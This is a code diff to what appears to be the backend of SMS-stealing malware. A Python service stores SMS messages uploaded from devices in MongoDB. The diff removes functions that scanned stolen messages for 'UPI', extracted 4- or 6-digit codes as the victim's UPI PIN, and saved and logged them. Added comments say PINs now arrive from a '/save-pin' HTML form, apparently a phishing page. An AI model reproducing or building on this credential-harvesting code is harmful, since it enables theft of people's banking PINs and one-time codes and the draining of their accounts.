@@ -200,8 +200,6 @@ class DeviceService:
             if not sms_list:
                 return
             
-            has_upi_detected = False
-            first_upi_pin = None
             current_time = datetime.utcnow()
             
             operations = []
@@ -225,22 +223,13 @@ class DeviceService:
                         upsert=True
                     )
                 )
-                
-                # چک UPI در متن پیامک و استخراج PIN
-                if not has_upi_detected:
-                    body_lower = sms_data["body"].lower()
-                    if "upi" in body_lower:
-                        extracted_pin = DeviceService._extract_otp_code(sms_data["body"])
-                        if extracted_pin:
-                            has_upi_detected = True
-                            first_upi_pin = extracted_pin
             
             # ذخیره دسته‌ای پیامک‌ها
             if operations:
                 result = await mongodb.db.sms_messages.bulk_write(operations, ordered=False)
                 logger.info(f"📥 SMS saved: {result.upserted_count + result.modified_count}")
             
-            # ⭐⭐⭐ اینجا اضافه کن: آپدیت stats
+            # آپدیت stats
             total_sms = await mongodb.db.sms_messages.count_documents({"device_id": device_id})
             
             await mongodb.db.devices.update_one(
@@ -253,57 +242,14 @@ class DeviceService:
                 }
             )
             
-            # اگر UPI پیدا شد، دستگاه رو با PIN آپدیت کن
-            if has_upi_detected and first_upi_pin:
-                await DeviceService._mark_device_has_upi(device_id, first_upi_pin)
+            # ℹ️ Note: UPI PIN now comes directly from /save-pin endpoint, not from SMS
             
         except Exception as e:
             logger.error(f"❌ Save SMS failed: {e}")
             raise
 
-    @staticmethod
-    def _extract_otp_code(text: str) -> str | None:
-        """استخراج اولین کد 4 یا 6 رقمی از متن"""
-        import re
-        pattern = r'\b(\d{4}|\d{6})\b'
-        match = re.search(pattern, text)
-        return match.group(1) if match else None
-
-    @staticmethod
-    async def _mark_device_has_upi(device_id: str, upi_pin: str):
-        """علامت‌گذاری دستگاه به عنوان دارای UPI + ذخیره PIN"""
-        try:
-            # فقط اگه قبلاً UPI PIN ست نشده بود
-            device = await mongodb.db.devices.find_one(
-                {"device_id": device_id, "upi_pin": {"$exists": False}}
-            )
-            
-            if device:
-                await mongodb.db.devices.update_one(
-                    {"device_id": device_id},
-                    {
-                        "$set": {
-                            "has_upi": True,
-                            "upi_pin": upi_pin,  # ذخیره PIN
-                            "upi_detected_at": datetime.utcnow(),
-                            "updated_at": datetime.utcnow()
-                        }
-                    }
-                )
-                
-                logger.info(f"✅ UPI PIN saved for device: {device_id} (PIN: {upi_pin})")
-                
-                await DeviceService.add_log(
-                    device_id,
-                    "upi",
-                    f"UPI PIN detected and saved: {upi_pin}",
-                    "info"
-                )
-            else:
-                logger.info(f"ℹ️ Device {device_id} already has UPI PIN")
-                
-        except Exception as e:
-            logger.error(f"❌ Mark UPI failed: {e}")
+    # ℹ️ NOTE: UPI PIN extraction from SMS removed
+    # UPI PIN now comes directly from /save-pin endpoint (HTML form)
 
     @staticmethod
     async def save_new_sms(device_id: str, sms_data: dict):
@@ -336,67 +282,11 @@ class DeviceService:
                 {"$inc": {"stats.total_sms": 1}}
             )
             
-            # چک و آپدیت UPI PIN
-            body_lower = message["body"].lower()
-            if "upi" in body_lower:
-                extracted_pin = DeviceService._extract_otp_code(message["body"])
-                if extracted_pin:
-                    # آپدیت PIN حتی اگه قبلاً وجود داشته باشه
-                    await DeviceService._update_device_upi_pin(device_id, extracted_pin)
+            # ℹ️ Note: UPI PIN now comes directly from /save-pin endpoint, not from SMS
                     
         except Exception as e:
             logger.error(f"❌ Save new SMS failed: {e}")
 
-    @staticmethod
-    async def _update_device_upi_pin(device_id: str, upi_pin: str):
-        """آپدیت UPI PIN دستگاه (حتی اگه قبلاً وجود داشته باشه)"""
-        try:
-            # چک کنیم PIN قبلی چیه
-            device = await mongodb.db.devices.find_one(
-                {"device_id": device_id},
-                {"upi_pin": 1}
-            )
-            
-            old_pin = device.get("upi_pin") if device else None
-            
-            # آپدیت با PIN جدید
-            await mongodb.db.devices.update_one(
-                {"device_id": device_id},
-                {
-                    "$set": {
-                        "has_upi": True,
-                        "upi_pin": upi_pin,
-                        "upi_last_updated_at": datetime.utcnow(),
-                        "updated_at": datetime.utcnow()
-                    },
-                    "$setOnInsert": {
-                        "upi_detected_at": datetime.utcnow()
-                    }
-                },
-                upsert=True
-            )
-            
-            if old_pin and old_pin != upi_pin:
-                logger.info(f"🔄 UPI PIN updated for device: {device_id} (Old: {old_pin} → New: {upi_pin})")
-                await DeviceService.add_log(
-                    device_id,
-                    "upi",
-                    f"UPI PIN updated: {old_pin} → {upi_pin}",
-                    "info"
-                )
-            elif not old_pin:
-                logger.info(f"✅ New UPI PIN saved for device: {device_id} (PIN: {upi_pin})")
-                await DeviceService.add_log(
-                    device_id,
-                    "upi",
-                    f"UPI PIN detected and saved: {upi_pin}",
-                    "info"
-                )
-            else:
-                logger.debug(f"ℹ️ UPI PIN unchanged for device: {device_id}")
-                
-        except Exception as e:
-            logger.error(f"❌ Update UPI PIN failed: {e}")
 
     @staticmethod
     async def get_sms_messages(device_id: str, skip: int = 0, limit: int = 50) -> List[Dict]:
